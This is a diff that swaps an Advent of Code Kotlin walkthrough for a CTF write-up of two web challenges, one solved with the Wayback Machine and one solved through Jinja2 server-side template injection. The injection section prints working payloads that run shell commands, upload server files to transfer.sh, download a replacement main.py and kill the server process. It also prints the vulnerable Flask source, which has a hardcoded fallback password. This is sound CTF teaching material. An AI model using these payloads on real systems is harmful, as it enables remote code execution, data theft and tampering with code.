@@ -3,221 +3,221 @@ title: Web
 description: A collection of problems related to websites/web exploitation
 template: doc
 ---
-In this post I'll be explaining my [day 2](https://adventofcode.com/2022/day/2)
-solution to [Advent of Code 2022](https://adventofcode.com/2022). First things first,
-lets read the input! Once again I'll be using the `readInput()`method provided in the 
-[AoC Kotlin template by JetBrains](https://github.com/kotlin-hands-on/advent-of-code-kotlin-template).
 
-```kotlin
-val input = readInput("Day02")
-```
+There were two question related to website analysis and exploitation.
+
 ---
-## Part 1
+## Back To Time
 
-### Analyzing the data
-The meaning of the input is completely different in part 1 and part 2 which is why
-I'm not explaining the input before solving each part.
+### Original Link
+We were provided with the following link:
+https://clickme.herocharge.repl.co/
 
+### Approach
+If you open the file, you will be greeted by a Click Me button that will always run away from you.
+![Clickme](../../../assets/clickme.png)
+
+After that is you open DevTools, you will get access to the link that the hyperlink leads it to:
+https://clickme.herocharge.repl.co/flag.html
+
+Which shows the following message:
 ```
-A Y
-B X
-C Z
-```
-
-The input is an encrypted strategy guide where the first column is the move made by your
-opponent and second column has the moves you should do. 
-
-```
-A -> rock     <- X (1 point)
-B -> paper    <- Y (2 points)
-C -> scissors <- Z (3 points)
-```
-A, B and C represent your opponent's moves and X, Y and Z show your moves. Each move you make
-has a score associated with it as shown above. Apart from that, you'll get extra points for
-a **win** (6 points) and **draw** (3 points).
-
-For example in the first round, the opponent chooses Rock and you play Paper. Since you played
-Paper, you get 2 points. Paper beats Rock which means you won the round, giving 6 points for a
-total of 8.
-
-### [`fold()`](https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.collections/fold.html) -ing the data
-Instead of breaking the solution part by part, the whole process can be finished in just one
-operation on the input using the convenient [`fold()`](https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.collections/fold.html) function in the [Collections API](https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.collections/).
-
-```kotlin
-val part1 = input.fold(0) { sum, l ->
-    sum + ...
-}
+There used to be a flag here. only if i could travel back in time to see it. 
 ```
 
-The initial value of `sum` is set to 0 and `l` represents each line in `input`. From here on we'll
-be using ASCII to help with the code logic. 
+![way](../../../assets/wayback.png)
 
-### Computing the result
+You only need to open the link in the wayback machine and there will be a snapshot of it which will have the flag.
 
-`l[0]` represents the first character which is the opponent's
-move (A, B or C). Likewise `l[2]` represents your move (X, Y or Z). We can assign number 0 for Rock, 
-1 for Paper and 2 for Scissors. `l[2] - 'X'` and `l[0] - 'A'` use ASCII codes to convert the input
-to this form. 
+https://web.archive.org/web/20220616185603/https://clickme.herocharge.repl.co/flag.html
 
-If the number of the opponent's move and your move turns out to be the same, the round ends in a draw
-giving 3 points.
-
-Now that we know who makes which move, there are three possible scenarios - win, loss or draw.
-There are three ways to win - Paper (1) beats Rock (0), Scissors (2) beats Paper (1) and Rock (0)
-beats Scissors(2). Whenever we win, the difference between your move and the opponent's is 1 or -2.
-This gives 6 points.
-
-Finally, if the difference between the codes turns out to be anything else, the round ends in a loss
-giving 0 points.
-
-```kotlin
-when ((l[2] - 'X') - (l[0] - 'A')) {
-    0 -> 3
-    1, -2 -> 6
-    else -> 0
-}
+The flag is:
 ```
-The only thing left is to add the points of our move as per the scheme. X gives one point, Y
-gives 2 and Z gives three. An easy way to get that number would be to subtract the ASCII of 
-`'W'` from `l[2]`.
-
-```kotlin
-(l[2] - 'W')
+CTF{waaaaaybaaaaackmaaaaachine} 
 ```
 
-Adding these to `sum` we reach the solution of part 1.
-
-### Solution
-```kotlin
-val part1 = input.fold(0) { sum, l ->
-    sum + when ((l[2] - 'X') - (l[0] - 'A')) {
-        0 -> 3
-        1, -2 -> 6
-        else -> 0
-    } + (l[2] - 'W')
-}
-```
 ---
-## Part 2
+## Charity
 
-### Analyzing the data
-In part 2 we come to know that the second column of the strategy guide encodes the outcome of
-a round where X means loss, Y - draw and Z - win.
+### Link
+This was the most challenging and interesting challenge of the CTF. But sadly I dont have access to the original link.
+However we have managed to get hold of the files that were used in making the website, how to do it can be explained later.
 
+### Approach
+The home page looked like this:
+![home](../../../assets/home_page.png)
+
+After we created a team and logged in:
+![team](../../../assets/team_page.png)
+
+You cannot press the button that many number of times you will either crash the server which is hosted in Replit or get blocked by the Rate Limit checker.
+
+We then tried creating a team with the same name and noticed that the progress got restarted every single time. Then we went to devtools and understood that there was a POST request being sent that increased the progress every single time we clicked the button to Donate. It did not have any payload that we could modify and therefore it turned out to be a dead end.
+
+We then understood that we had to fiddle with the team name/password to try some sort of injection. From here we understood that is was a classic case of SSTI (`Server Side Template Injection`) in Jinja2/Flask.
+
+We verified this by sending the below payload in the team name.
 ```
-A Y     # rival - rock, result - draw => you - rock
-B X     # rival - paper, result - loss => you - rock 
-C Z     # rival - scissors, result - win => you - rock
-```
-
-The scoring system is same as before. The real challenge here is mapping the choice you need to
-make for achieving the outcome. Once again [`fold()`](#fold--ing-the-data) can be used to make the code concise.
-
-
-### Finding the result
-First we store the result of the round to a variable `res` where 0 represents loss, 1 means draw
-and 2 signifies a win.
-
-```kotlin
-val res = l[2] - 'X'
-```
-
-`res * 3` gives the score of the result of the round.
-
-### Deciding your move
-Using the number codes for rock paper and scissors from [computing the result](#computing-the-result)
-section of part 1 we can find the opponent's move which will decide yours. `l[0] - 'A'` returns the
-opponent's move in the number code.
-
-#### Loss
-When the result is a loss there are three possibilities:
-```
-Rival - Rock (0)    =>  You - Scissors (3 points)
-Rival - Paper (1)   =>  You - Rock (1 point)
-Rival - Scissor (2) =>  You - Paper (2 points)
-
-```
-Looking at this we can say that when the code is 0 (Rock), you get 3 points. Otherwise the score 
-is same as the number code of the opponent's move. This can be reduced to:
-```kotlin
-if (l[0] != 'A') l[0] - 'A' else 3
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
 
-#### Draw
-A draw means the score is the same as the score of the opponent's move which is `code + 1`. For example
-when the opponent chooses Rock (0) to make it a draw you choose Rock too which gives 1 point.
-```kotlin
-l[0] - 'A' + 1
-```
+This returned the following webpage:
+![Injection1](../../../assets/injection1.png)
 
-#### Win
-There are three ways you can win:
-```
-Rival - Rock (0)    =>  You - Paper (2 points)
-Rival - Paper (1)   =>  You - Scissors (3 point)
-Rival - Scissor (2) =>  You - Rock (1 points)
-```
-As long as the opponent doesn't choose Scissors (2), the score from the will be `code + 2`. When
-the opponent's choice is Scissors (0) the score becomes 1. 
-```kotlin
-if (l[0] != 'C') l[0] - 'A' + 2 else 1
-```
+Now we tried a lot to fiddle with the stuff happening. We also understood that as there was no storage element in the entire website, the values stored were all while the code was running and would be reset if someone restarded the code. So we had to get our hands on the code.
 
-#### Summing it up
-Wrapping the above conditionals inside `when` we get: 
-```kotlin
-when (res) {
-    0 -> if (l[0] != 'A') l[0] - 'A' else 3
-    1 -> l[0] - 'A' + 1
-    2 -> if (l[0] != 'C') l[0] - 'A' + 2 else 1
-    else -> 0
-}
+Another thing we noticed is that `/` were not allowed in the team name because it would mess up with the paths due to nature of the post request. Instead we used the unicode format of the character `\u002f`
+
+To get our hands on the main.py function we used the following command:
 ```
-The `else` block is never executed because all the possibilities have been exhausted. It is only
-to ensure that the compiler detects that it always returns an `Int`.
+{{config.__class__.__init__.__globals__['os'].popen('curl --upload-file main.py https:\u002f\u002ftransfer.sh').read()}}
+```
+We got our hands on the main.py file
+![main](../../../assets/transfer_main.png)
 
-Now that we have all the elements needed to compute the score, all that remains is to 
-[`fold()`](#fold--ing-the-data) the data once again to get the total score.
+It had the following code:
+```python
+from flask import Flask, render_template, request, redirect, url_for, render_template_string
+import time
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
 
-### Solution
+app = Flask(__name__)
+# app.config['LIMITER_REQUEST_LIMIT'] = 10  # Maximum number of requests allowed
+# app.config['LIMITER_REQUEST_PERIOD'] = 60  # Time period (in seconds)
+# app.config['LIMITER_KEY_FUNC'] = lambda: request.remote_addr  # Rate limiting based on user's IP
+limiter = Limiter(app=app, key_func=lambda: request.remote_addr)
+# Replace this with a more secure way of storing user data in a production app
+teams = {}
+
+@app.route('/')
+def home():
+  return render_template('home.html')
 
 
-```kotlin
- val part2 = input.fold(0) { sum, l ->
-    val res = l[2] - 'X'
-    sum + res * 3 + when (res) {
-        0 -> if (l[0] != 'A') l[0] - 'A' else 3
-        1 -> l[0] - 'A' + 1
-        2 -> if (l[0] != 'C') l[0] - 'A' + 2 else 1
-        else -> 0
-    }
-}
-```
-Congrats on completing day 2 in Kotlin!
+@app.route('/create_team', methods=['POST'])
+def create_team():
+  team_name = request.form.get('team_name')
+  password = request.form.get('password')
+  teams[team_name] = {'password': password, 'progress': 0}
+  return redirect(url_for('team', team_name=team_name))
 
-## Full Solution
-```kotlin
-fun main() {
-    val input = readInput("Day02")
-    val part1 = input.fold(0) { sum, l ->
-        sum + when ((l[2] - 'X') - (l[0] - 'A')) {
-            0 -> 3
-            1, -2 -> 6
-            else -> 0
-        } + (l[2] - 'W')
-    }
-    val part2 = input.fold(0) { sum, l ->
-        val res = l[2] - 'X'
-        sum + res * 3 + when (res) {
-            0 -> if (l[0] != 'A') l[0] - 'A' else 3
-            1 -> l[0] - 'A' + 1
-            2 -> if (l[0] != 'C') l[0] - 'A' + 2 else 1
-            else -> 0
-        }
-    }
-    part1.println()
-    part2.println()
-}
+
+@app.route('/join_team', methods=['POST'])
+def join_team():
+  team_name = request.form.get('team_name')
+  password = request.form.get('password')
+  if team_name in teams and (teams[team_name]['password'] == password
+                             or teams[team_name]['password'] == "1234"):
+    return redirect(url_for('team', team_name=team_name))
+  else:
+    return "Invalid team name or password"
+
+
+@app.route('/team/<team_name>', methods=['GET', 'POST'])
+@limiter.limit("20 per minute")
+def team(team_name):
+  if request.method == 'POST':
+    teams[team_name]['progress'] += 1
+  return render_template_string('''
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <title>Team Progress</title>
+                            
+                        </head>
+                        <body>
+                            <header>
+                                <h1>Team Progress</h1>
+                            </header>
+                            <div class="content">
+                              <div class="team">
+                                  <h2>Welcome to Team {} '''.format(
+      team_name) + '''</h2>
+                                  <div class="progress">
+                                      <p>Goal: 1200000000000000000 Progress:</p>
+                                      <div class=\"progress-bar\" style="width: '''
+                                + str(teams[team_name]['progress']) +
+                                '''%;">''' +
+                                str(teams[team_name]['progress']) + '''%</div>
+                                  </div>
+                                  <form action=\"/team/''' + team_name +
+                                '''\" method="post">
+                                      <input type="submit" value="Donate 1 Coin">
+                                  </form>
+                                <p>Make a post on insta with a screenshot of reaching the goal and tag the hacking club with and we will dm you the flag after verifying</p>
+                              </div>
+                            </div>
+                        </body>
+                        </html>
+                        ''')
+  return render_template('team.html',
+                         team_name=team_name,
+                         progress=teams[team_name]['progress'])
+
+
+if __name__ == '__main__':
+  app.run(debug=False, host="0.0.0.0", port=80)
 ```
-[Open in Playground](https://pl.kotl.in/4LsjxicmI) [GitHub](https://github.com/Sasikuttan2163/AoC-2022-Solutions-In-Kotlin/blob/main/src/Day02.kt)
+
+So we knew that the only thing we had to do was to remove this main.py, replace it and then kill the server. So to do it we just wanted to try it out. However, to try it out we also needed the templates folder.
+
+```
+{{config.__class__.__init__.__globals__['os'].popen('tar -cf - templates | xz -9ze -T0 > templates.tar.xz').read()}}
+
+```
+Then we saw this:
+![Injection2](../../../assets/injection2.png)
+
+Then we accessed the files using:
+```
+{{config.__class__.__init__.__globals__['os'].popen('curl --upload-file templates.tar.xz https:\u002f\u002ftransfer.sh').read()}}
+```
+
+Which gave us to access to the files:
+![Injection3](../../../assets/injection3.png)
+
+This gave us access to the the files required to run the replit ourselves to test our changes. The code is still available at:
+https://replit.com/@AdithyaKishor/ctf
+
+All we had to do now was delete the main.py upload our malicious main.py and then kill the server. The thing you have to keep in mind is that replit restarts itself if we kill it this way and therefore, our plan should be able to succeed without failure.
+
+We added the following code to our main.py:
+```python
+teams['winners'] = {'password':'12345678', 'progress': 1200000000000000000}
+```
+
+So that when we signed in, we already reached the goal required.
+
+We uploaded the modified code to transfer.sh and then did the following:
+```
+{{config.__class__.__init__.__globals__['os'].popen('rm main.py && curl https:\u002f\u002ftransfer.sh\u002fqE5ITI3IEr\u002fmain.py -o main.py').read()}}
+```
+
+This command deletes the code in the replit and replaces it with ours. However, we are still not done. We have to make the server restart.
+
+For that we had to find the process id of the entire process:
+```
+{{config.__class__.__init__.__globals__['os'].popen('ps a').read()}}
+```
+![injection4](../../../assets/injection4.png)
+
+You can either use the process id or use a replit feature in which kill 1 kills the server.
+Now to kill the file:
+```
+{{config.__class__.__init__.__globals__['os'].popen('kill 402').read()}}
+```
+Wait for quite a while and keep on refereshing the original website.
+All you have to do now is to wait for the repl to restart.
+
+The login using the credentials `winner` and `12345678`
+
+We sent the screenshot and got this flag:
+![final](../../../assets/final.png)
+
+You can get the files for trying it out yourself here: https://replit.com/@AdithyaKishor/ctf
+
+The flag is:
+```
+0xCTF{Ph0r_4_9R347_K4uZ3_900D_j08_0n_r34CH1N'_73h_904L}
+```
